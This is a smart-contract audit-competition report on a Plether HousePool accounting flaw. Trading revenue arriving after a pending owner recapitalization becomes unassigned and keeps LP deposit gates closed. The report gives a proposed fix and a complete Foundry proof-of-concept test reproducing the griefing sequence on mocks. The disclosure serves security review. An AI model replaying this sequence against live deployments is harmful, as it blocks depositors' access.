# \#99212 [SC-High] Late trading revenue bypasses a pending recapitalization bucket and strands value that blocks LP deposits.

**Submitted on Nov 12th 2026 at 12:35:43 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99212
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When Senior principal is impaired but nonzero, Junior principal is zero, and the owner has already sent an exact-gap recapitalization, an unprivileged trader can produce new pool trading revenue before the next reconciliation. `HousePool` records the extra cash but does not queue it as pending Revenue. Reconciliation first uses that ordinary surplus to restore Senior, then assigns the excess of the owner's pending recapitalization to `unassignedAssets`. The resulting balance continues to block LP deposits even after a later ordinary trade restores positive Junior principal.

## Vulnerability Details

At [`HousePool.sol:644-648`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L644-L648), all recapitalization inflows are queued, while trading Revenue is queued only if **both stored tranche principals are zero**:

```solidity
if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
    _recordPendingClaimantInflow(kind, amount);
} else if (seniorPrincipal + juniorPrincipal == 0) {
    _recordPendingClaimantInflow(kind, amount);
}
```

The relevant state has surviving Senior principal below its high-water mark, wiped Junior principal, and a pending recapitalization exactly equal to the Senior gap. A later order produces trading revenue while Senior remains nonzero. Its cash enters `accountedAssets`, but `pendingTradingRevenueAssets` stays zero. During LP settlement, [`HousePoolReconcilePlanLib.sol:68-99`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L99) reserves the pending recap, then routes the ordinary cash surplus to Senior first. [`HousePoolPendingPreviewLib.sol:103-135`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L135) applies the pending recap afterward; only the reduced Senior gap can absorb it, and the rest becomes unassigned. Thus the *excess owner recapitalization cash*, equal in amount to the late trading revenue, becomes unassigned. The physical trading-revenue cash has already restored Senior.

The accounting specification currently describes ordinary surplus before pending buckets. That makes program judgment on whether this timing effect is intended a material eligibility risk. The issue is the externally triggerable recovery-order consequence: a trader can add revenue after an honest exact-gap recapitalization is pending and before the next settlement, changing the result from Junior recovery and open deposit gates to unassigned assets and blocked gates. The test compares those orders from the same snapshot. Its no-trade baseline has zero unassigned assets but Junior is still wiped, so its deposit gate is already closed; the decisive additional check is that a later ordinary revenue-producing trade restores Junior principal but does **not** reopen the attack branch's deposit gates. The same later trade leaves the control branch's gates open. Setup uses the Pool's permissionless no-position LP settlement; every later reconciliation uses public Router settlement with a genuine matured one-share redemption. The test never impersonates a configured Vault. The sequence does not require owner collusion.

This is distinct from published Cecuro MED-12. That case began after **both** principals were zero, so Revenue had already been queued; its repair recomputed a continuation flag inside the pending-bucket helper. Here Senior principal is nonzero and the later Revenue never enters that helper's bucket, so that repair does not cover this sequence. The closest known issue and its repair are disclosed in the references below.

## Impact Details

The Foundry PoC uses the six weighted release FX feeds, release 1% VPI and margin settings, the public V3 Router, genuine owner recapitalization, and a real pending one-share Junior redemption for each post-setup reconciliation. Fourteen 5% market moves produce Senior principal **811,284.483393 USDG**, Junior principal **0**, and a Senior high-water mark of **818,899.508661 USDG**. Public LP settlement with a one-share, zero-quote redemption performs the reconciliation before the owner action; the owner then sends exactly **7,615.025268 USDG** for the recorded gap. The late order increases `accountedAssets` by **244.220461 USDG**; the observed allocation difference is **248.212461 USDG** after all pricing and accounting effects.

If the public LP settlement runs after the late order, **248.212461 USDG** is recorded in `unassignedAssets`, Junior remains at zero, the Junior request and shared deposit-settlement gates are closed, and a 1 USDG Junior deposit request reverts `TerminallyWiped`. A further normal trade and public LP settlement then make Junior principal positive, but the unassigned balance persists and both deposit gates remain closed. In the same-state control, reconciling the pending recap before the same first order leaves **248.212461 USDG** as Junior principal and zero unassigned assets. The further normal trade leaves both deposit gates open and the 1 USDG Junior request succeeds. With no first trade at all, settlement leaves unassigned assets at zero, though the terminally wiped Junior gate is still closed pending future revenue. The late trader pays to create the initial revenue. The test proves a sticky deposit-liveness problem and allocation divergence; it does **not** show direct LP theft or attacker profit. The owner can later use `assignUnassignedAssets` with a fresh mark to resolve the quarantine, so the demonstrated impact is operator-dependent deposit grief rather than a permanent freeze.

## Mitigation

Preserve the ownership order of a pending recapitalization and revenue produced before its settlement. One possible change is to queue Revenue whenever a recapitalization bucket is already pending, even when stored Senior principal is nonzero:

```diff
 if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
     _recordPendingClaimantInflow(kind, amount);
-} else if (seniorPrincipal + juniorPrincipal == 0) {
+} else if (seniorPrincipal + juniorPrincipal == 0 || pendingRecapitalizationAssets > 0) {
     _recordPendingClaimantInflow(kind, amount);
 }
```

The change should be tested with partial recapitalization, surviving Senior and Junior shares, and repeated settlements. If the intended policy is to give late ordinary revenue priority over an already-pending owner recap, document and explicitly handle the resulting ownerless excess without allowing a trader-triggered deposit lock.

## References

- [Plether competition scope and impact list](https://immunefi.com/audit-competition/plether/scope/)
- [Pinned `HousePool.sol`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol)
- [Pinned accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md)
- [Prior audit, MED-12, page 33](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [Published MED-12 repair](https://github.com/Plether-Fi/plether-core/commit/f852f969352f14406bef582d52cab4b024b32db7)

## Proof of Concept

## Proof of Concept

At the pinned commit, save the following complete test as `packages/perps/test/perps/spec/lp/OpenKrittRevenuePriority90Public.t.sol`, then run from `packages/perps`:

```bash
forge test --match-path test/perps/spec/lp/OpenKrittRevenuePriority90Public.t.sol --match-test test_PublicRouterLateRevenueVersusRecapFirst -vv
```

Expected: one passing test. The first order increases `accountedAssets` by 244.220461 USDG in each branch. The attack branch records 248.212461 USDG unassigned; after the second ordinary trade, Junior principal is positive but deposit gates remain closed. The control records zero unassigned assets and accepts a Junior deposit after the same trades. No in-scope contract is modified. Mock Pyth updates and USDG are the permitted external replacements.


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract OpenKrittRevenuePriority90PublicTest is BasePerpTest {

    address internal constant WINNER = address(0x1001);
    address internal constant LATE_TRADER = address(0x1002);
    address internal constant KEEPER = address(0x1003);
    address internal constant FOLLOWUP_TRADER = address(0x1004);
    address internal constant DUST = address(0x1005);
    bytes32[6] internal feedIds = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] internal feedWeights = [uint256(0.576e18), 0.136e18, 0.119e18, 0.091e18, 0.042e18, 0.036e18];
    uint256[6] internal feedBases = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        for (uint256 i; i < 6; ++i) {
            ids[i] = feedIds[i];
            weights[i] = feedWeights[i];
            bases[i] = feedBases[i];
            inversions[i] = _inverted(i);
            uint256 raw = _feedRaw(i, 1e8);
            baseMockPyth.setPrice(ids[i], int64(uint64(raw)), uint64(raw / 10_000), -8, vm.getBlockTimestamp());
        }
        PletherOracle releaseOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(releaseOracle)}));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        vm.warp(SETUP_TIMESTAMP + 14 days);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 200_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 800_000e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.initMarginBps = 20;
        params.maintMarginBps = 10;
    }

    function test_PublicRouterLateRevenueVersusRecapFirst() public {
        _fundDustSettlementShare();
        _gradualImpairment();
        _publicReconcile();
        emit log_named_uint("public senior after loss", pool.seniorPrincipal());
        emit log_named_uint("public junior after loss", pool.juniorPrincipal());
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(pool.seniorPrincipal(), 0);
        uint256 gap = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        assertGt(gap, 0);
        settlementToken.mint(address(this), gap);
        settlementToken.approve(address(engine), gap);
        engine.recapitalizePool(gap);
        assertEq(pool.pendingRecapitalizationAssets(), gap);
        assertEq(pool.unassignedAssets(), 0);

        uint256 noTrade = vm.snapshotState();
        _publicReconcile();
        emit log_named_uint("no-trade unassigned", pool.unassignedAssets());
        emit log_named_uint("no-trade junior", pool.juniorPrincipal());
        emit log_named_uint("no-trade junior gate", pool.canAcceptTrancheDeposits(false) ? 1 : 0);
        assertEq(pool.unassignedAssets(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertFalse(pool.canAcceptTrancheDeposits(false));
        assertTrue(vm.revertToState(noTrade));
        vm.deleteStateSnapshot(noTrade);

        uint256 branch = vm.snapshotState();
        uint256 misrouted = _lateOpenAndSettle(true);
        emit log_named_uint("misrouted", misrouted);
        emit log_named_uint("junior requests allowed attack", pool.canAcceptTrancheDeposits(false) ? 1 : 0);
        emit log_named_uint("deposit settlement allowed attack", pool.canSettleDepositEntries() ? 1 : 0);
        assertFalse(pool.canAcceptTrancheDeposits(false));
        assertFalse(pool.canSettleDepositEntries());
        assertEq(juniorVault.maxRequestDeposit(address(this)), 0);
        assertGt(misrouted, 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark());
        settlementToken.mint(address(this), 1e6);
        settlementToken.approve(address(juniorVault), 1e6);
        vm.expectRevert(bytes4(keccak256("TrancheVault__TerminallyWiped()")));
        juniorVault.requestDeposit(1e6, address(this));
        _followupOpenAndReconcile();
        assertGt(pool.juniorPrincipal(), 0);
        assertEq(pool.unassignedAssets(), misrouted);
        assertFalse(pool.canAcceptTrancheDeposits(false));
        assertFalse(pool.canSettleDepositEntries());

        assertTrue(vm.revertToState(branch));
        vm.deleteStateSnapshot(branch);
        _publicReconcile();
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        uint256 controlUnassigned = _lateOpenAndSettle(false);
        emit log_named_uint("control junior", pool.juniorPrincipal());
        emit log_named_uint("control unassigned", controlUnassigned);
        emit log_named_uint("junior requests allowed control", pool.canAcceptTrancheDeposits(false) ? 1 : 0);
        emit log_named_uint("deposit settlement allowed control", pool.canSettleDepositEntries() ? 1 : 0);
        assertTrue(pool.canAcceptTrancheDeposits(false));
        assertTrue(pool.canSettleDepositEntries());
        assertGt(juniorVault.maxRequestDeposit(address(this)), 0);
        assertEq(controlUnassigned, 0);
        assertGt(pool.juniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), misrouted);
        _followupOpenAndReconcile();
        assertGt(pool.juniorPrincipal(), misrouted);
        assertEq(pool.unassignedAssets(), 0);
        assertTrue(pool.canAcceptTrancheDeposits(false));
        assertTrue(pool.canSettleDepositEntries());
        settlementToken.mint(address(this), 1e6);
        settlementToken.approve(address(juniorVault), 1e6);
        assertGt(juniorVault.requestDeposit(1e6, address(this)), 0);
    }

    function _fundDustSettlementShare() internal {
        router.updateMarkPrice(_sixFeedUpdateData(1e8));
        settlementToken.mint(address(this), 10e6);
        settlementToken.approve(address(juniorVault), 10e6);
        uint256 depositId = juniorVault.requestDeposit(10e6, address(this));
        vm.warp(juniorVault.depositEpochStart(depositId));
        router.updateMarkPrice(_sixFeedUpdateData(1e8));
        pool.settleLpEpoch(0, 0);
        uint256 shares = juniorVault.claimDeposit(depositId, 10e6, address(this), address(this));
        vm.warp(vm.getBlockTimestamp() + 1 days);
        juniorVault.transfer(DUST, 1);
        assertGt(shares, 1);
    }

    function _gradualImpairment() internal {
        router.updateMarkPrice(_sixFeedUpdateData(1e8));
        _fundTrader(WINNER, 100_000e6);
        uint256 rounds;
        for (uint256 i; i < 25; ++i) {
            uint256 size = pool.accountedAssets() * 3e11 / 1e20 * 1e20;
            bytes32 openId = keccak256(abi.encodePacked("gradual-open", i));
            bytes32 closeId = keccak256(abi.encodePacked("gradual-close", i));
            _execute(_commit(WINNER, _request(openId, size, 10_000e6, 1, false)), 1e8);
            _execute(_commit(WINNER, _request(closeId, size, 0, type(uint256).max, true)), 95_000_000);
            _publicReconcile();
            rounds = i + 1;
            if (pool.seniorPrincipal() < pool.seniorHighWaterMark() && pool.juniorPrincipal() == 0) {
                break;
            }
            vm.warp(vm.getBlockTimestamp() + 7 days);
            router.updateMarkPrice(_sixFeedUpdateData(1e8));
        }
        emit log_named_uint("five percent rounds", rounds);
        emit log_named_uint("gradual senior", pool.seniorPrincipal());
        emit log_named_uint("gradual junior", pool.juniorPrincipal());
        emit log_named_uint("gradual senior mark", pool.seniorHighWaterMark());
        assertLt(pool.seniorPrincipal(), pool.seniorHighWaterMark());
        assertEq(pool.juniorPrincipal(), 0);
        vm.warp(vm.getBlockTimestamp() + 7 days);
        router.updateMarkPrice(_sixFeedUpdateData(1e8));
    }

    function _lateOpenAndSettle(
        bool publicSettle
    ) internal returns (uint256) {
        _fundTrader(LATE_TRADER, 100_000e6);
        uint256 accountedBefore = pool.accountedAssets();
        uint64 id = _commit(LATE_TRADER, _request("late-open", 200_000e18, 30_000e6, 1, false));
        _execute(id, 1e8);
        uint256 revenue = pool.accountedAssets() - accountedBefore;
        assertGt(revenue, 0);
        emit log_named_uint("late pool cash increase", revenue);
        if (publicSettle) {
            assertGt(pool.pendingRecapitalizationAssets(), 0);
            assertEq(pool.pendingTradingRevenueAssets(), 0);
            _publicReconcile();
        } else {
            _publicReconcile();
        }
        return pool.unassignedAssets();
    }

    function _followupOpenAndReconcile() internal {
        _fundTrader(FOLLOWUP_TRADER, 100_000e6);
        uint64 id = _commit(FOLLOWUP_TRADER, _request("followup-open", 100_000e18, 15_000e6, 1, false));
        _execute(id, 1e8);
        _publicReconcile();
    }

    function _publicReconcile() internal {
        uint256 unlockAt = juniorVault.lastDepositTime(DUST) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlockAt) {
            vm.warp(unlockAt);
        }
        router.updateMarkPrice(_sixFeedUpdateData(1e8));
        vm.prank(DUST);
        uint256 epoch = juniorVault.requestRedeem(1, DUST, DUST);
        vm.warp(pool.lpEpochStart(epoch));
        router.updateMarkPrice(_sixFeedUpdateData(1e8));
        router.settleLpEpoch(_sixFeedUpdateData(1e8));
        vm.prank(DUST);
        juniorVault.claimRedeemRefund(epoch, DUST, DUST);
    }

    function _commit(
        address account,
        OrderV3Types.OrderRequest memory request
    ) internal returns (uint64 id) {
        vm.prank(account);
        id = router.commitOrder(request);
    }

    function _execute(
        uint64 id,
        uint256 price
    ) internal {
        bytes[] memory updateData = _sixFeedUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _request(
        bytes32 clientId,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool close
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = targetPrice;
        request.isClose = close;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: IOrderLifecycleBook(address(router.lifecycleBook())).currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _inverted(
        uint256 i
    ) internal pure returns (bool) {
        return i == 1 || i == 3 || i == 4 || i == 5;
    }

    function _feedRaw(
        uint256 i,
        uint256 basketPrice
    ) internal view returns (uint256) {
        uint256 baseRaw = _inverted(i) ? 1e16 / feedBases[i] : feedBases[i];
        return _inverted(i) ? baseRaw * 1e8 / basketPrice : baseRaw * basketPrice / 1e8;
    }

    function _sixFeedUpdateData(
        uint256 basketPrice
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw = _feedRaw(i, basketPrice);
            ticks[i] = MockPyth.FeedUpdate(
                feedIds[i],
                MockPyth.MockPrice(int64(uint64(raw)), uint64(raw / 10_000), -8, publishTime, publishTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

}
```
